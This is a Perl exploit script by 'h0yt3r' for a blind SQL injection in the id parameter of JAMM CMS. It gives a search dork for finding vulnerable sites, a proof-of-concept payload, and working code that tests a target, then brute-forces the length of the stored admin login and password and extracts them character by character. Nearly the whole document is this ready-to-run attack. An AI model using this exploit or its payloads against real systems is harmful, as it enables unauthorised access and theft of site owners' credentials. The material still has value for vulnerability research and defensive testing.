#!/usr/bin/perl
######################
#
#JAMM CMS (id) Blind SQL Injection Vulnerability
#
######################
#
#Bug by: h0yt3r
#
#Dork: &quot;powered by JAMM&quot;
#
##
###
##
#
#http://www.site.de/cms/?id=blah
#Ok when we give $id an unexpected value like this we get an SQL Error.
#Unfortunately the script is so rude that it doesn&#039;t want to show us any data when we UNION SELECT.
#But when we give $id an existing value and append AND 1=0 the site changes.
#So Blind SQL Injection is possible.
#For mySQL Version&gt;=5 we can use subquerys to retrive data,
#otherwise we have to use BENCHMARK().
#
#
#SQL Injection:
#http://[target]/[path]/index.php?id=[SQL]
#
#PoC for mySQL Version = 5:
#index.php?id=10/**/and/**/substring((select/**/concat(login,0x3a,password)/**/from/**/jamm_cms_owen_website_user/**/limit/**/0,1),1,1)/**/like/**/0xbla/*
#
#If this condition returns true it would be the same as if we inject AND 1=1
#so the site gives normal output.
#
#Possible Perl Exploit (will not work always because of different tablenames etc):
#THIS IS JUST AN EXAPLE!!!

use LWP::UserAgent;
my $userAgent = LWP::UserAgent-&gt;new;

usage();

$server = $ARGV[0];
$dir = $ARGV[1];


print&quot;\n&quot;;
if (!$dir) { die &quot;Read Usage!\n&quot;; }


$filename =&quot;index.php&quot;;

my $vulnCheck = &quot;http://&quot;.$server.$dir.$filename;
;

my @Daten = (&quot;61&quot;,&quot;62&quot;,&quot;63&quot;,&quot;64&quot;,&quot;65&quot;,&quot;66&quot;,&quot;67&quot;,&quot;68&quot;,&quot;69&quot;,&quot;6A&quot;,&quot;6B&quot;,&quot;6C&quot;,&quot;6D&quot;,&quot;6E&quot;,&quot;6F&quot;,&quot;70&quot;,&quot;71&quot;,&quot;72&quot;,&quot;73&quot;,&quot;74&quot;,&quot;75&quot;,&quot;76&quot;,&quot;77&quot;,&quot;78&quot;,&quot;79&quot;,&quot;7A&quot;,&quot;3A&quot;,&quot;5F&quot;,&quot;31&quot;,&quot;32&quot;,&quot;33&quot;,&quot;34&quot;,&quot;35&quot;,&quot;36&quot;,&quot;37&quot;,&quot;38&quot;,&quot;39&quot;,&quot;30&quot;);

print&quot;[x]Connecting:&quot;;
my $Attack= $userAgent-&gt;get($vulnCheck.&quot;?id=&#039;&quot;);
if($Attack-&gt;is_success)
{
    print &quot; Connected \n&quot;;
    print &quot;[x]Vulnerable Check: &quot;;
    if($Attack-&gt;content =~ m/You have an error in your SQL syntax/i)
        { print &quot;Vulnerable \n&quot;; }
    else
        { print &quot;Not Vulnerable&quot;; exit;}
}

else
{
    print &quot; Connection Failed&quot;;
    exit;
}

my $hex=&quot;&quot;;
my $length;

print &quot;[x]Bruteforcing Length \n&quot;;

my $lengthCounter = 1;
while(1)
{
    ##table name will be different sometimes
    my $url = &quot;&quot;.$vulnCheck.&quot;?id=10%20%20and%20LENGTH((select%20concat(login,0x3a,password)%20from%20jamm_cms_owen_website_user%20limit%200,1))=&quot;.$lengthCounter.&quot;&quot;;
    my $Attack= $userAgent-&gt;get($url);
    my $content = $Attack-&gt;content;
    if($content =~ m/&lt;META NAME=&#039;Title&#039; CONTENT=&#039;&#039;&gt;/i)
    {       
        $lengthCounter++;       
    }
    else
    {
        if($content =~ m/You have an error in your SQL syntax/i)
        {
            print &quot;Something wrong. mySQL Version? &quot;; exit;
        }
       
        else
        {
            $length=$lengthCounter;       
            last;
        }
    }
}


print &quot;[x]Injecting Black Magic \n&quot;;

for($b=1;$b&lt;=$length;$b++)
{
    for(my $u=0;$u&lt;28;$u++)
    {       
        ##table name will be different sometimes
        my $url = &quot;&quot;.$vulnCheck.&quot;?id=10%20%20and%20substring((select%20concat(login,0x3a,password)%20from%20jamm_cms_owen_website_user%20limit%200,1),&quot;.$b.&quot;,1)%20like%200x&quot;.$Daten[$u].&quot;&quot;;

        my $Attack= $userAgent-&gt;get($url);

        my $content = $Attack-&gt;content;
       
        ##This will also change sometimes. Take content of AND 1=0
        if($content =~ m/&lt;META NAME=&#039;Title&#039; CONTENT=&#039;&#039;&gt;/i)  
        {           
           
        }

        else
        {
            print &quot;[x]    Found Char &quot;.$Daten[$u].&quot;\n&quot;;           
            $hex=$hex.$Daten[$u];
            last;           
        }
    }
}

print &quot;[x]Converting \n&quot;;
my $a_str = hex_to_ascii($hex);

@login = split(/\:/, $a_str);

print &quot;[x]Success! \n&quot;;
print &quot;     Username: $login[0]\n&quot;;
print &quot;     Password: $login[1]&quot;;
   
sub hex_to_ascii ($)
{       
        (my $str = shift) =~ s/([a-fA-F0-9]{2})/chr(hex $1)/eg;
        return $str;
}



sub usage()
{
    print q
    {
    ######################################################
             JAMM CMS Remote Blind SQL Injection Exploit   
                         -Written by h0yt3r-            
    Usage: JAMM_CMS.pl [Server] [Path]
    Sample:
    perl JAMM.pl.pl www.site.com /cms/
    ######################################################
    };

}

